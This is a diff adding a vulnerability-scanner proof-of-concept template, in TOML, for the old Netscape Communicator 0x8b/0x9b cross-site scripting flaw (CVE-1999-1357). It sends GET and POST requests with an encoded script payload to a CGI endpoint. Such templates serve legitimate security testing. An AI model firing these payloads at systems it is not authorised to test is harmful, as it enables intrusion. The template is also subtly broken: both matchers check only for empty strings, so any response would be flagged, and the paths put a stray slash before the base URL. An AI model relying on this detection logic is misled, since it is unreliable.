@@ -1,0 +1,54 @@
+[info]
+author = "ave"
+description = "检测 CGI 程序是否未过滤 0x8b/0x9b 字符，Netscape Communicator 4.04-4.7 将其转换为 < 和 > 标签，导致 XSS 攻击"
+id = "POC-AVE-1999-1074"
+name = "Netscape Communicator 0x8b/0x9b XSS 检测 PoC"
+severity = "high"
+tags = [
+    "cve-1999-1357",
+    "xss",
+    "netscape",
+    "cgi",
+]
+vuln_id = [
+    "CVE-1999-1357",
+    "AVE-1999-1074",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/test.cgi?input=%8bscript%3ealert(1)%3c/script%3e%9b"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "",
+    "",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/test.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "input=%8bscript%3ealert(1)%3c/script%3e%9b"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "",
+    "",
+]
